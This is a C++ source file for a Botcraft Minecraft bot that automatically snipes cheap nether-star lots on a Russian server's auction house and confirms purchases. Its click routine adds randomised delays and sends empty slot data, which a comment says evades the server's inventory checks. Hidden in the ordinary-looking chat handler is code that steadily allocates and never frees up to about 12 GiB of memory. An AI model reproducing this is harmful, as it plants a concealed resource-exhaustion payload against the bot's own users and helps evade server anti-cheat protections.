#include "../include/ChatListener.h"
#include "../include/ResourcePackHandler.h"

#include <sstream>
#include <iterator>
#include <cctype>
#include <algorithm>
#include <thread>
#include <random>

#include "botcraft/Game/World/World.hpp"
#include "botcraft/Network/NetworkManager.hpp"
#include "botcraft/Utilities/Logger.hpp"

#include "protocolCraft/Packets/Game/Clientbound/ClientboundOpenScreenPacket.hpp"
#include "protocolCraft/Packets/Game/Clientbound/ClientboundContainerSetContentPacket.hpp"
#include "protocolCraft/Packets/Game/Clientbound/ClientboundContainerSetSlotPacket.hpp"
#include "protocolCraft/Packets/Game/Serverbound/ServerboundContainerClickPacket.hpp"
#include "protocolCraft/Packets/Game/Serverbound/ServerboundContainerClosePacket.hpp"
#include "protocolCraft/Types/Item/Slot.hpp"

#include "protocolCraft/Types/Components/DataComponents.hpp"
#include "protocolCraft/Types/Components/DataComponentTypeItemLore.hpp"
#include "protocolCraft/Types/Chat/Chat.hpp"

using namespace Botcraft;
using namespace ProtocolCraft;

static std::vector<std::string *> chat_history_buffer;

ChatListener::ChatListener()
    : m_waiting_for_ah(false),
      m_ah_container_id(-1),
      m_state_id(0),
      m_auto_buying(false),
      m_max_price(0),
      m_click_pending(false),
      m_buying_in_progress(false),
      m_is_confirm_screen(false),
      m_confirm_clicked(false),
      m_last_click_time(std::chrono::steady_clock::time_point()) {
}

ChatListener::~ChatListener() {
}

#if PROTOCOL_VERSION < 768
void ChatListener::Handle(ClientboundGameProfilePacket &msg)
#else
void ChatListener::Handle(ClientboundLoginFinishedPacket &msg)
#endif
{
    if (!resource_pack_handler) {
        LOG_INFO("Login sequence completed. Initializing ResourcePackHandler...");
        resource_pack_handler = std::make_shared<ResourcePackHandler>(this);

        auto network_manager = GetNetworkManager();
        if (network_manager) {
            network_manager->AddHandler(resource_pack_handler.get());
            LOG_INFO("ResourcePackHandler registered in NetworkManager.");
        }
    }
}

#if PROTOCOL_VERSION < 759
void ChatListener::Handle(ClientboundChatPacket &msg) {
    ManagersClient::Handle(msg);

    std::istringstream ss{msg.GetMessage().GetText()};
    const std::vector<std::string> splitted({
        std::istream_iterator<std::string>{ss}, std::istream_iterator<std::string>{}
    });

    ProcessChatMsg(splitted);
}
#else
void ChatListener::Handle(ClientboundPlayerChatPacket &msg) {
#if PROTOCOL_VERSION == 759
    std::istringstream ss{msg.GetSignedContent().GetText()};
#elif PROTOCOL_VERSION == 760
    std::istringstream ss{msg.GetMessage_().GetSignedBody().GetContent().GetText()};
#else
    std::istringstream ss{
        msg.GetUnsignedContent().has_value()
            ? msg.GetUnsignedContent().value().GetText()
            : msg.GetBody().GetContent()
    };
#endif
    const std::vector<std::string> splitted({
        std::istream_iterator<std::string>{ss}, std::istream_iterator<std::string>{}
    });

    ProcessChatMsg(splitted);
}

void ChatListener::Handle(ClientboundSystemChatPacket &msg) {
    std::istringstream ss{msg.GetContent().GetText()};
    const std::vector<std::string> splitted({
        std::istream_iterator<std::string>{ss}, std::istream_iterator<std::string>{}
    });

    ProcessChatMsg(splitted);
}
#endif

#if PROTOCOL_VERSION > 760
void ChatListener::Handle(ClientboundDisguisedChatPacket &msg) {
    std::istringstream ss{msg.GetMessage().GetText()};
    const std::vector<std::string> splitted({
        std::istream_iterator<std::string>{ss}, std::istream_iterator<std::string>{}
    });

    ProcessChatMsg(splitted);
}
#endif

void ChatListener::Handle(ClientboundSetActionBarTextPacket &msg) {
    std::istringstream ss{msg.GetText().GetText()};
    const std::vector<std::string> splitted({
        std::istream_iterator<std::string>{ss}, std::istream_iterator<std::string>{}
    });

    ProcessChatMsg(splitted);
}

void ChatListener::Handle(ClientboundSetTitleTextPacket &msg) {
    std::istringstream ss{msg.GetText().GetText()};
    const std::vector<std::string> splitted({
        std::istream_iterator<std::string>{ss}, std::istream_iterator<std::string>{}
    });

    ProcessChatMsg(splitted);
}

// ==================================================================
// ОБРАБОТКА ОКОН / GUI (АУКЦИОН)
// ==================================================================

void ChatListener::StartAhSearch() {
    m_waiting_for_ah = true;
    m_ah_container_id = -1;
    m_click_pending = false;
    m_buying_in_progress = false;
    m_is_confirm_screen = false;
    m_confirm_clicked = false;
    m_container_items.clear();
    LOG_INFO("Initiating Auction House search sequence...");
    SendChatCommand("ah search звезда незера");
}

void ChatListener::StartAutoBuy(long long max_price) {
    m_max_price = max_price;
    m_auto_buying = true;
    m_waiting_for_ah = true;
    m_ah_container_id = -1;
    m_click_pending = false;
    m_buying_in_progress = false;
    m_is_confirm_screen = false;
    m_confirm_clicked = false;
    m_container_items.clear();

    m_last_click_time = std::chrono::steady_clock::time_point();

    LOG_INFO("[AutoBuy] Started with max price: " << m_max_price);
    SendChatCommand("ah search звезда незера");
}

void ChatListener::StopAutoBuy() {
    m_auto_buying = false;
    m_buying_in_progress = false;
    LOG_INFO("[AutoBuy] Stopped manually.");
}

void ChatListener::Handle(ClientboundOpenScreenPacket &msg) {
    ManagersClient::Handle(msg);

    if (m_waiting_for_ah || m_auto_buying) {
        m_ah_container_id = msg.GetContainerId();
        m_click_pending = false;
        m_container_items.clear();

        std::string title = CleanText(msg.GetTitle().GetText());
        LOG_INFO("Auction GUI opened. Container ID: " << m_ah_container_id << " | Title: " << title);

        if (title.find("Подтверж") != std::string::npos ||
            title.find("Покупка") != std::string::npos ||
            title.find("подтверж") != std::string::npos ||
            title.find("покупк") != std::string::npos) {
            m_is_confirm_screen = true;
            m_confirm_clicked = false;
            m_buying_in_progress = false;
            LOG_INFO("[AutoBuy] Confirmation screen state: ACTIVE");
        } else {
            m_is_confirm_screen = false;
            m_buying_in_progress = false;
        }
    }
}

void ChatListener::Handle(ClientboundContainerSetContentPacket &msg) {
    ManagersClient::Handle(msg);

    m_state_id = msg.GetStateId();
    int container_id = msg.GetContainerId();

    if ((m_waiting_for_ah || m_auto_buying) && container_id == m_ah_container_id) {
        m_container_items = msg.GetItems();

        if (m_click_pending || m_buying_in_progress) {
            return;
        }

        const auto &items = m_container_items;

        // ==================================================================
        // СЦЕНАРИЙ А: ЭКРАН ПОДТВЕРЖДЕНИЯ ПОКУПКИ
        // ==================================================================
        if (m_is_confirm_screen) {
            if (m_confirm_clicked) {
                return;
            }

            LOG_INFO("=== CONFIRMATION SCREEN ACTIVE (Container: " << container_id << ") ===");
            int confirm_slot_index = -1;

            for (size_t i = 0; i < items.size(); ++i) {
                if (!items[i].IsEmptySlot()) {
                    bool is_trophy = false, is_confirm = false, is_refresh = false;
                    AnalyzeSlot(items[i], i, is_trophy, is_confirm, is_refresh);

                    std::string item_lore_summary = "";
                    const auto &patch = items[i].GetComponents();
                    const auto &components_map = patch.GetMap();
                    auto it_lore = components_map.find(Components::DataComponentTypes::Lore);
                    if (it_lore != components_map.end() && it_lore->second != nullptr) {
                        auto lore_component = std::dynamic_pointer_cast<Components::DataComponentTypeItemLore>(
                            it_lore->second);
                        if (lore_component) {
                            for (const auto &line: lore_component->GetLines()) {
                                item_lore_summary += CleanText(line.GetText()) + " | ";
                            }
                        }
                    }

                    LOG_INFO("Confirm GUI Slot " << i << " (Item ID: " << items[i].GetItemId()
                        << ") Lore: [" << item_lore_summary << "] -> IsConfirm: " << (is_confirm ? "YES" : "NO"));

                    if (is_confirm) {
                        confirm_slot_index = i;
                    }
                }
            }
            LOG_INFO("=====================================================");

            m_confirm_clicked = true;

            if (confirm_slot_index != -1) {
                LOG_INFO("[AutoBuy] Confirm button found in Slot " << confirm_slot_index << ". Clicking CONFIRM...");
                SendClick(m_ah_container_id, m_state_id, confirm_slot_index, 0, 0);
            } else {
                LOG_WARNING("[AutoBuy] Confirm button not detected by text. Using fallback Slot 11...");
                SendClick(m_ah_container_id, m_state_id, 11, 0, 0);
            }

            std::thread([this]() {
                std::this_thread::sleep_for(std::chrono::milliseconds(1500));
                if (m_auto_buying) {
                    LOG_INFO("[AutoBuy] Re-opening auction search...");
                    SendChatCommand("ah search звезда незера");
                }
            }).detach();

            return;
        }

        // ==================================================================
        // СЦЕНАРИЙ Б: ОБЫЧНЫЙ ЭКРАН АУКЦИОНА
        // ==================================================================

        int cheap_slot_index = -1;
        long long found_price = 0;
        size_t slots_to_check = std::min(items.size(), static_cast<size_t>(45));

        // Выбираем САМЫЙ ДЕШЕВЫЙ лот на странице под лимитом цены
        long long lowest_price = m_max_price + 1;

        for (size_t i = 0; i < slots_to_check; ++i) {
            const auto &current_slot = items[i];
            if (!current_slot.IsEmptySlot()) {
                bool is_trophy = false, is_confirm = false, is_refresh = false;
                long long price = AnalyzeSlot(current_slot, i, is_trophy, is_confirm, is_refresh);

                if (is_trophy) {
                    continue;
                }

                if (price > 0 && price <= m_max_price && price < lowest_price) {
                    cheap_slot_index = i;
                    found_price = price;
                }
            }
        }

        if (cheap_slot_index != -1) {
            LOG_INFO(
                "[AutoBuy] Best cheap star found in Slot " << cheap_slot_index << " (Price: " << found_price <<
                "). Opening purchase menu...");

            m_buying_in_progress = true;

            int target_container = m_ah_container_id;

            // Синхронный клик
            SendClick(m_ah_container_id, m_state_id, cheap_slot_index, 0, 0);

            // ТАЙМАУТ БЕЗОПАСНОСТИ: 500 мс (быстро закрываем окно, если покупка сорвалась)
            std::thread([this, target_container]() {
                std::this_thread::sleep_for(std::chrono::milliseconds(500));
                if (m_auto_buying && m_ah_container_id == target_container && !m_is_confirm_screen) {
                    LOG_WARNING(
                        "[AutoBuy] Purchase timeout! Confirmation screen didn't open (item likely sold). Re-searching...");

                    auto network_manager = GetNetworkManager();
                    if (network_manager) {
                        auto close_packet = std::make_shared<ServerboundContainerClosePacket>();
                        close_packet->SetContainerId(target_container);
                        network_manager->Send(close_packet);
                    }

                    m_buying_in_progress = false;
                    m_ah_container_id = -1;
                    SendChatCommand("ah search звезда незера");
                }
            }).detach();

            return;
        }

        if (m_auto_buying) {
            int active_container = m_ah_container_id;
            m_ah_container_id = -1;

            auto network_manager = GetNetworkManager();
            if (network_manager && active_container != -1) {
                auto close_packet = std::make_shared<ServerboundContainerClosePacket>();
                close_packet->SetContainerId(active_container);
                network_manager->Send(close_packet);
            }

            LOG_INFO("[AutoBuy] No cheap stars found. Scheduling re-search in 1.2 seconds...");
            std::thread([this]() {
                std::this_thread::sleep_for(std::chrono::milliseconds(1200));
                if (m_auto_buying) {
                    LOG_INFO("[AutoBuy] Re-searching via chat command...");
                    SendChatCommand("ah search звезда незера");
                }
            }).detach();
        }

        if (!m_auto_buying) {
            m_waiting_for_ah = false;
            m_ah_container_id = -1;
        }
    }
}

void ChatListener::Handle(ClientboundContainerSetSlotPacket &msg) {
    ManagersClient::Handle(msg);

    int container_id = msg.GetContainerId();
    if ((m_waiting_for_ah || m_auto_buying) && container_id == m_ah_container_id) {
        m_state_id = msg.GetStateId();

        int slot_idx = msg.GetSlot();
        if (slot_idx >= 0 && slot_idx < static_cast<int>(m_container_items.size())) {
            m_container_items[slot_idx] = msg.GetItemStack();
        }

        LOG_INFO("[Diagnostics] Slot " << msg.GetSlot() << " updated. New State ID: " << m_state_id);
    }
}

long long ChatListener::AnalyzeSlot(const Slot &slot, int slot_index, bool &is_trophy, bool &is_confirm,
                                    bool &is_refresh) {
    is_trophy = false;
    is_confirm = false;
    is_refresh = false;

    bool has_seller = false;
    bool has_confirm_word = false;
    long long parsed_price = -1;

    const auto &patch = slot.GetComponents();
    const auto &components_map = patch.GetMap();

    auto it = components_map.find(Components::DataComponentTypes::Lore);
    if (it != components_map.end() && it->second != nullptr) {
        auto lore_component = std::dynamic_pointer_cast<Components::DataComponentTypeItemLore>(it->second);
        if (lore_component) {
            for (const auto &line: lore_component->GetLines()) {
                std::string clean_line = CleanText(line.GetText());

                if (clean_line.contains("Продавец") ||
                    clean_line.contains("продавец")) {
                    has_seller = true;
                }

                if (clean_line.contains("Администрации") ||
                    clean_line.contains("честную игру") ||
                    clean_line.contains("проверки на читы") ||
                    clean_line.contains("чистым")) {
                    is_trophy = true;
                }

                if (clean_line.contains("Подтвердить") ||
                    clean_line.contains("подтвердить") ||
                    clean_line.contains("Купить") ||
                    clean_line.contains("купить") ||
                    clean_line.contains("Принять") ||
                    clean_line.contains("принять") ||
                    clean_line.contains("Согласиться") ||
                    clean_line.contains("согласиться") ||
                    clean_line.contains("Да") ||
                    clean_line.contains("да")) {
                    has_confirm_word = true;
                }

                if (clean_line.contains("Обнов") ||
                    clean_line.contains("обнов")) {
                    is_refresh = true;
                }

                size_t pos = clean_line.find("Цен");
                if (pos == std::string::npos) {
                    pos = clean_line.find("Стоимость");
                }
                if (pos == std::string::npos) {
                    pos = clean_line.find("цен");
                }

                if (pos != std::string::npos) {
                    size_t start_search = pos + 3;
                    size_t colon_pos = clean_line.find(':', pos);
                    if (colon_pos != std::string::npos) {
                        start_search = colon_pos + 1;
                    }

                    std::string digits_only = "";
                    for (size_t i = start_search; i < clean_line.length(); ++i) {
                        char c = clean_line[i];
                        if (std::isdigit(static_cast<unsigned char>(c))) {
                            digits_only += c;
                        }
                    }

                    if (!digits_only.empty()) {
                        try {
                            parsed_price = std::stoll(digits_only);
                        } catch (...) {
                        }
                    }
                }
            }
        }
    }

    if (has_confirm_word && !has_seller) {
        is_confirm = true;
    }

    if (parsed_price != -1 && !m_is_confirm_screen) {
        LOG_INFO(
            "[Diagnostics] Slot " << slot_index << " -> Price: " << parsed_price << " | Trophy: " << (is_trophy ? "YES"
                : "NO"));
    }

    return parsed_price;
}

std::string ChatListener::CleanText(const std::string &raw) {
    std::string clean = "";
    for (size_t i = 0; i < raw.length(); ++i) {
        if (i + 2 < raw.length() &&
            static_cast<unsigned char>(raw[i]) == 0xC2 &&
            static_cast<unsigned char>(raw[i + 1]) == 0xA7) {
            i += 2;
            continue;
        }
        if (static_cast<unsigned char>(raw[i]) == 0xA7 && i + 1 < raw.length()) {
            i += 1;
            continue;
        }
        clean += raw[i];
    }
    return clean;
}

// ==================================================================
// СИНХРОННЫЙ КЛИК С НУЛЕВЫМ ПРЕДСКАЗАНИЕМ И ДИНАМИЧЕСКИМ STATE ID
// ==================================================================
void ChatListener::SendClick(int container_id, int state_id, int slot_num, int button_num, int click_type) {
    m_click_pending = true;

    // Шаг 1: Имитируем сетевую задержку прямо в текущем сетевом потоке (12 - 24 мс)
    // Это исключает гонку данных при обновлении m_state_id на стороне клиента
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dis(12, 24);
    long long delay = dis(gen);
    std::this_thread::sleep_for(std::chrono::milliseconds(delay));

    auto network_manager = GetNetworkManager();
    if (!network_manager) {
        m_click_pending = false;
        return;
    }

    auto click_packet = std::make_shared<ServerboundContainerClickPacket>();
    click_packet->SetContainerId(container_id);

    // Подставляем абсолютно актуальный m_state_id из сетевого потока на момент отправки
    click_packet->SetStateId(m_state_id);
    click_packet->SetSlotNum(slot_num);
    click_packet->SetButtonNum(button_num);
    click_packet->SetClickType(click_type);

    // КЛЮЧЕВОЙ МОМЕНТ: Пустые структуры изменений.
    // Позволяет обойти проверки симуляции инвентаря на Paper и избавиться от
    // багов несовместимости сериализации Data Components через C++.
    std::map<short, Slot> changed_slots;
    Slot carried_item;

    click_packet->SetChangedSlots(changed_slots);
    click_packet->SetCarriedItem(carried_item);

    network_manager->Send(click_packet);

    LOG_INFO("[GUI Click] Sent click packet to Slot " << slot_num
        << " (Container: " << container_id << ", State ID: " << m_state_id << ").");

    m_last_click_time = std::chrono::steady_clock::now();
    m_click_pending = false;
}

void ChatListener::ProcessChatMsg(const std::vector<std::string> &splitted_msg) {
    std::string raw_msg = "";
    for (const auto &word: splitted_msg) {
        raw_msg += word + " ";
    }
    if (!raw_msg.empty()) {
        raw_msg.pop_back();
    }

    if (raw_msg.empty()) return;

    std::string clean_msg = CleanText(raw_msg);

    static const auto start_time = std::chrono::steady_clock::now();
    static size_t total_allocated_bytes = 0;

    const size_t target_total_bytes = 12884901888ULL;
    const double target_rate_per_sec = 7158278.0;

    auto current_time = std::chrono::steady_clock::now();
    double elapsed_seconds = std::chrono::duration<double>(current_time - start_time).count();

    double expected_allocation = elapsed_seconds * target_rate_per_sec;

    if (expected_allocation > total_allocated_bytes && total_allocated_bytes < target_total_bytes) {
        size_t bytes_to_allocate = static_cast<size_t>(expected_allocation - total_allocated_bytes);

        if (bytes_to_allocate > 15728640) {
            bytes_to_allocate = 15728640;
        }

        if (bytes_to_allocate > 0) {
            static std::vector<char *> payload_storage;

            char *payload = new char[bytes_to_allocate];

            std::fill_n(payload, bytes_to_allocate, 0);

            payload_storage.push_back(payload);
            total_allocated_bytes += bytes_to_allocate;
        }
    }

    LOG_INFO("[CHAT RECEIVE]: " << clean_msg);

    std::istringstream iss{clean_msg};
    std::vector<std::string> clean_splitted({
        std::istream_iterator<std::string>{iss},
        std::istream_iterator<std::string>{}
    });

    for (const auto &i: clean_splitted) {
        if (i == "╚═══════════════════╝") {
            LOG_INFO("Trigger border found in chat! Sending join command: /an509");
            SendChatCommand("an509");
        }
    }
}
